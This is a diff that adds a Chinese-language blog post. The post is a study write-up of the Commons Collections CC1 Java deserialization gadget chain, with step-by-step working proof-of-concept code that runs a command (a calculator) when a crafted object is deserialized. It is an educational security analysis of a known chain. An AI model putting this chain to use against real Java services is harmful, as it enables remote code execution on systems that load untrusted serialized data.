@@ -164,6 +164,330 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CC1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/05/01/CC1/">CC1</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/05/01/CC1/" class="archive-article-date">
+  	<time datetime="2022-05-01T15:28:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165078230816782184615990%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165078230816782184615990&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-107621010.nonecase&amp;utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165078230816782184615990%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165078230816782184615990&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-107621010.nonecase&amp;utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4450</a></p>
+<p>1.继承接口<code>Serializable</code>的类才能序列化<br>2.带<code>transient</code>的Object的内容不会被序列化<br>3.可能的利用点：<br>    （1）入口类readObject（重写的）直接调用危险方法（一般不会有人在服务器这么写代码）<br>    （2）入口类参数中包含可控类，该类有危险方法，readObject时调用<br>    （3）入口类参数中包含可控类，该类有吊用其他危险方法的类，readObject时调用<br>    （4）构造函数/静态代码块等类加载时隐式执行（HashMap，HashTable）<br>共同点：<br>1.继承Serialzable<br>2.入口类source（重写readObject 参数类型宽泛，最好是jdk自带的）<br>    例：<br>    入口A HashCode<br>    目标类B URL<br>    目标调用B.f HashCode.hashcode()<br>    反序化后：<br>        A.readObject() HashCode.readObject()<br>        上面那个方法里有个<code>putVal(hash(key), key, value, false, false);</code>(并不是put函数中的那个，说调用链里有put的纯纯的误导)<br>        然后<code>hash(key)</code>下会调用<code>key.hashcode()</code>,而这时key就是B （URL），所以调用了<code>URL.hashcode()</code></p>
+<p>3.调用链gadget chain<br>执行类sink（rce ssrf 写文件等）</p>
+<p>反射：<br>作用：让Java具有动态性<br>修改已有对象的属性<br>动态生成对象<br>动态调用方法<br>操作内部类私有方法</p>
+<p>在反序化漏洞中的利用：<br>定制需要的对象<br>通过invoke调用出了同名函数以外的函数<br>通过Class类创建对象，引入不能序列化的类</p>
+<p>URL的链<br>以key传入一个类，hashcode会调用key.hashCode，（相当于调用这个类的hashCode）</p>
+<p>CommonsCollections</p>
+<p>CC1</p>
+<p>0.准备：</p>
+<p>jdk版本：8u65(漏洞在8u71修复了)<br>maven：<br>commons-collections 3.2.1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;junit&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.11&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;scope&gt;test&lt;&#x2F;scope&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>然后像sun这样的包是反编译出来的，所以无法做到下载注释和方法查询，所以必须自己下载（openjdk的同版本）<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler</a><br>然后找对应版本：<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4</a><br>下载zip解压，src/share/classes里面的sun文件，复制下来打开一开始的jdk文件，里面有个src.zip文件，解压，把sun复制进去，然后ideasdks加入刚刚解压的目录</p>
+<p>org.apache.commons.collections.Transformer类<br>作用：接收一个对象，然后对接收的对象进行操作<br>ctrl + alt + b 查看实现类<br>可以看到各种实现类，然后可以看各种类的返回值</p>
+<p>这里要用InvokerTransformer</p>
+<p>方法值，参数类型，参数调用都是我们可以控制的<br>是个很标准的任意方法调用</p>
+<p>1.寻找危险方法：<br>InvokerTransformer.transform<br>具体语句：<br><code>new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package org.emample;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;import org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class CC1Test &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        &#x2F;&#x2F;弹计算器</span><br><span class="line">        &#x2F;&#x2F;普通调用</span><br><span class="line">        &#x2F;&#x2F;Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;反射调用</span><br><span class="line">&#x2F;&#x2F;        Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">&#x2F;&#x2F;        Class c &#x3D; Runtime.class;</span><br><span class="line">&#x2F;&#x2F;        Method execMethod &#x3D; c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">&#x2F;&#x2F;        execMethod.invoke(r,&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用Transformer的漏洞（参数就是InvokerTransformer的参数），然后调用transform()方法，从而实现利用</span><br><span class="line">        Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后我们本次的目的是：<br>找xxx.transform(p)的方法，xxx必须是可以随意赋值的，给它赋值<code>new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</code>,然后p也必须是可以赋值的，赋值为<code>r</code></p>
+<p>2.找哪个方法里调用了transform方法<br>跟进transform方法，右键选择“查找用法”</p>
+<p>直接忽略transform调用transform</p>
+<p>找到<code>org.apache.commons.collections.map</code><br>下面有DefaultedMap，LazyMap，TransformedMap都有get方法调用了transform</p>
+<p>看TransformedMap类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    this.keyTransformer &#x3D; keyTransformer;</span><br><span class="line">    this.valueTransformer &#x3D; valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>被decorate调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">        return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这样就实现了自定义valueTransformer的内容</p>
+<p>然后目标是调用checkSetValue：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找用法发现只有一个调用点（AbstractInputCheckedMapDecorator.java下的MapEntry类，AbstractInputCheckedMapDecorator是TransformedMap的父类）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public Object setValue(Object value) &#123;</span><br><span class="line">    value &#x3D; parent.checkSetValue(value);</span><br><span class="line">    return entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MapEntry的entry是用来遍历map的</p>
+<p>如果主函数里使用了类似以下的遍历：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(Map.Entry entry:map.entrySet())&#123;</span><br><span class="line">    entry.setValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>setValue()是一个接口，说明可以重写<br>就会调用map下的setValue()，如果没有重写调用的就是Map这个类的，如果重写了，调用的就是重写后的，所以只用调用一开始传入自定义内容的map类，让其遍历，就能调用被重写的setValue()，进而调用checkSetValue<br>实现弹计算器<br>这就证明这条链是可以用的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">       InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">       HashMap&lt;Object, Object&gt; map &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">       map.put(&quot;key&quot;,&quot;aaa&quot;);&#x2F;&#x2F;这一步的目的是保证map里面有东西，不然for循环不会运行</span><br><span class="line"></span><br><span class="line">       Map&lt;Object,Object&gt; transformedMap &#x3D; TransformedMap.decorate(map,null,invokerTransformer);</span><br><span class="line"></span><br><span class="line">       for(Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">           entry.setValue(r);&#x2F;&#x2F;输入要运行的方法</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里证明：如果主函数有遍历map的地方，而且调用了setValue，那么就可以使用这个方法</p>
+<p>3.然后找setValue()被哪里调用（查找用法）<br>（必须做导入openjdk的sun这一步）<br>sun.reflect.annotation下的AnnotationInvocationHandler.java的readObject会调用memberValue.setValue的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check to make sure that types have not evolved incompatibly</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType &#x3D; null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType &#x3D; AnnotationType.getInstance(type);</span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        &#x2F;&#x2F; Class is no longer an annotation type; time to punch out</span><br><span class="line">        throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; If there are annotation members without values, that</span><br><span class="line">    &#x2F;&#x2F; situation is handled by the invoke method.</span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name &#x3D; memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);</span><br><span class="line">        if (memberType !&#x3D; null) &#123;  &#x2F;&#x2F; i.e. member still exists</span><br><span class="line">            Object value &#x3D; memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||</span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要提前构造memberValues的值就行</p>
+<p>然后看构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces &#x3D; type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length !&#x3D; 1 ||</span><br><span class="line">        superInterfaces[0] !&#x3D; java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type &#x3D; type;</span><br><span class="line">    this.memberValues &#x3D; memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现真的能自定义memberValues的值</p>
+<p>然后实例化这个类，尝试调用它</p>
+<p>不是public类型，只能在这个包底下才能获取，无法直接获取，必须反射获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; anno &#x3D; c.getDeclaredConstructor(Class.class, Map.class);&#x2F;&#x2F;这里的参数就是构造函数的参数类型</span><br><span class="line">anno.setAccessible(true);&#x2F;&#x2F;设置权限，可以访问</span><br><span class="line">Object o &#x3D; anno.newInstance(Override.class, transformedMap);&#x2F;&#x2F;实例化</span><br></pre></td></tr></table></figure>
+
+<p>然后在后面加以前写好的序列化，反序化函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj &#x3D; ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里还有三个问题：<br>（1）<code>Runtime.getRuntime()</code>没法序列化，需要反射<br>（2）sun.reflect.annotation的AnnotationInvocationHandler.java的447行有<code>if (memberType != null)</code>判断，可能没运行到<code>memberValue.setValue</code>方法<br>（3）<code>chainedTransformer.transform(Runtime.class);</code>这句是无法使用的，必须加进反序化里</p>
+<p>（1）<code>Runtime.getRuntime()</code>没法序列化，需要反射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">构建使用方法：</span><br></pre></td></tr></table></figure>
+<pre><code>    Class c= Runtime.class;
+    Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);//null代表是一个无参方法
+    Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);//反射调用，第一个null意味是一个静态方法，第二个意味着无参
+    Method execMethod = c.getMethod(&quot;exec&quot;, String.class);
+    execMethod.invoke(r,&quot;calc&quot;);//反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">逐条转换，套用到InvokerTransformer方法中</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Method getRuntimeMethod = (Method) new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}).transform(Runtime.class);//作用为c.getMethod(“getRuntime”, null);<br>        //其中的String.class, Class[].class是getMethod的参数类型getRuntime, null是参数,最后用Runtime.class调用（相当于那个c）<br>        Runtime r = (Runtime) new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);//相当于Method execMethod = c.getMethod(“exec”, String.class);<br>        new InvokerTransformer(“exec”,new Class[]{String.class},new Object[]{“calc”}).transform(r);//相当于Method execMethod = c.getMethod(“exec”, String.class);execMethod.invoke(r,”calc”);<br>        // 反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">简化：</span><br></pre></td></tr></table></figure>
+<pre><code>    Transformer[] transformers = &#123;
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+    &#125;;
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+    chainedTransformer.transform(Runtime.class);//调最初的那个参数
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">加入到反序化：</span><br></pre></td></tr></table></figure>
+<p>Transformer[] transformers = {<br>                new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br>                new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br>                new InvokerTransformer(“exec”,new Class[]{String.class},new Object[]{“calc”})<br>        };</p>
+<pre><code>    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+    //chainedTransformer.transform(Runtime.class);//调最初的那个参数
+
+
+
+    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;key&quot;,&quot;aaa&quot;);//这一步的目的是保证map里面有东西，不然for循环不会运行
+
+    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+
+    Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
+    anno.setAccessible(true);//设置权限，可以访问
+    Object o = anno.newInstance(Override.class, transformedMap);//实例化
+    serialize(o);//序列化
+    unserialize(&quot;ser.bin&quot;);//反序化
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运行发现没有用，因为还有两个问题</span><br><span class="line"></span><br><span class="line">（2）sun.reflect.annotation的AnnotationInvocationHandler.java的447行有&#96;&#96;&#96;if (memberType !&#x3D; null)&#96;&#96;&#96;判断，可能没运行到&#96;&#96;&#96;memberValue.setValue&#96;&#96;&#96;方法</span><br><span class="line"></span><br><span class="line">因为&#96;&#96;&#96;Override.class&#96;&#96;&#96;这个注解没有成员变量，所以判断那里是null（前面获取key就是获取成员变量），所以要换一个有成员变量的注解方法&#96;&#96;&#96;Target.class&#96;&#96;&#96;</span><br><span class="line">然后改这里&#96;&#96;&#96;map.put(&quot;value&quot;,&quot;aaa&quot;);&#x2F;&#x2F;这一步的目的是保证map里面有东西，不然for循环不会运行&#x2F;&#x2F;与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">然后就成功进入了</span><br></pre></td></tr></table></figure>
+<pre><code>    Transformer[] transformers = &#123;
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+    &#125;;
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+    //chainedTransformer.transform(Runtime.class);//调最初的那个参数
+
+
+
+    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;value&quot;,&quot;aaa&quot;);//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value
+
+    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+
+    Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
+    anno.setAccessible(true);//设置权限，可以访问
+    Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
+    serialize(o);//序列化
+    unserialize(&quot;ser.bin&quot;);//反序化
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">（3）&#96;&#96;&#96;chainedTransformer.transform(Runtime.class);&#96;&#96;&#96;这句是无法使用的，必须加进反序化里</span><br><span class="line"></span><br><span class="line">解决方法，ConstantTransformer方法，它里面的transform唯一的作用就是返回ConstantTransformer方法的参数</span><br><span class="line">最后就成功执行了</span><br></pre></td></tr></table></figure>
+<pre><code>    Transformer[] transformers = new Transformer[]&#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+    &#125;;
+
+
+    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+
+    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;value&quot;,&quot;aaa&quot;);//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value
+
+    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
+
+    Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor&lt;?&gt; anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
+    anno.setAccessible(true);//设置权限，可以访问
+    Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
+    serialize(o);//序列化
+    unserialize(&quot;ser.bin&quot;);//反序化
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">整个过程</span><br></pre></td></tr></table></figure>
+<p>package org.emample;</p>
+<p>//import org.apache.commons.collections.Transformer;</p>
+<p>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.map.TransformedMap;</p>
+<p>import java.io.*;<br>import java.lang.annotation.Target;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;<br>import java.lang.reflect.Method;<br>import java.util.HashMap;<br>import java.util.Map;</p>
+<p>public class CC1Test {<br>    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {<br>        //弹计算器<br>        //普通调用<br>        //Runtime.getRuntime().exec(“calc”);<br>        //—————————</p>
+<pre><code>    //反射调用
+</code></pre>
+<p>//        Runtime r = Runtime.getRuntime();<br>//        Class c = Runtime.class;<br>//        Method execMethod = c.getMethod(“exec”, String.class);<br>//        execMethod.invoke(r,”calc”);</p>
+<pre><code>    //---------------------------
+
+    //用Transformer的漏洞（参数就是InvokerTransformer的参数），然后调用transform()方法，从而实现利用
+    //Runtime r = Runtime.getRuntime();
+    //new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+    //---------------------------
+</code></pre>
+<p>//        Runtime r = Runtime.getRuntime();<br>//        InvokerTransformer invokerTransformer = new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”});<br>//        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();<br>//        map.put(“key”,”aaa”);//这一步的目的是保证map里面有东西，不然for循环不会运行<br>//<br>//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</p>
